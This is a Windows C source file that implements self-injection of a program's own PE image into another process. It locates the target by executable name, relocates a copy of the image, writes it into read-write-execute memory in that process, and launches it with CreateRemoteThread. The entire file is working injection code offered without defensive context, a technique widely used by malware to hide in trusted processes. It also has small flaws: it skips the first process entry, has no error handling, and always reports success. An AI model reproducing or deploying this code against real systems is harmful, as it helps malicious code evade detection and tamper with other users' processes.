// Reduce the size of Windows.h to improve compile time
#define WIN32_LEAN_AND_MEAN
#define NOCOMM
#define NOCLIPBOARD
#define NODRAWTEXT
#define NOMB
#include <windows.h>
#include <tlhelp32.h>

#include "self_inject.h"

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
}BASE_RELOCATION_ENTRY;

uint32_t get_pid_by_name(const char* ProcessName) {
    PROCESSENTRY32 pt = {
            .dwSize = sizeof(PROCESSENTRY32)
    };
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hsnap, &pt)) { // must call this first
        while (Process32Next(hsnap, &pt))
        {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        }
    }
    CloseHandle(hsnap); // close handle on failure
    return 0;
}

bool self_inject(uint32_t process_id, LPTHREAD_START_ROUTINE entry_point, void* parameter) {
    // Open the target process - this is the process we will be injecting this PE into
    HANDLE target_process = OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, FALSE, process_id);

    // Get current image's base address
    void* image_base = GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* dos_header = image_base;
    IMAGE_NT_HEADERS* nt_header = (image_base + dos_header->e_lfanew);

    // Allocate a new memory block and copy the current PE image to this new memory block
    void* local_image = malloc(nt_header->OptionalHeader.SizeOfImage);
    memcpy(local_image, image_base, nt_header->OptionalHeader.SizeOfImage);

    // Allocate a new memory block in the target process. This is where we will be injecting this PE
    void* target_image = VirtualAllocEx(target_process, NULL, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Calculate delta between addresses of where the image will be located in the target process and where it's located currently
    uintptr_t delta_image_base = (uintptr_t)target_image - (uintptr_t)image_base;

    // Relocate local_image, to ensure that it will have correct addresses once it's in the target process
    IMAGE_BASE_RELOCATION* relocation_table = (IMAGE_BASE_RELOCATION*)(local_image + nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocation_entries_count = 0;

    while (relocation_table->SizeOfBlock > 0) {
        relocation_entries_count = (relocation_table->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        BASE_RELOCATION_ENTRY* relative_addresses = (BASE_RELOCATION_ENTRY*)(&relocation_table[1]);

        for (short i = 0; i < relocation_entries_count; i++) {
            if (relative_addresses[i].Offset) {
                uintptr_t* patched_address = (uintptr_t*)(local_image + relocation_table->VirtualAddress + relative_addresses[i].Offset);
                *patched_address += delta_image_base;
            }
        }
        relocation_table = (IMAGE_BASE_RELOCATION*)((uintptr_t)relocation_table + relocation_table->SizeOfBlock);
    }

    // Write the relocated local_image into the target process
    WriteProcessMemory(target_process, target_image, local_image, nt_header->OptionalHeader.SizeOfImage, NULL);
    free(local_image);

    // Start the injected PE inside the target process
    CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE)(entry_point + delta_image_base), parameter, 0, NULL);

    return true;
}
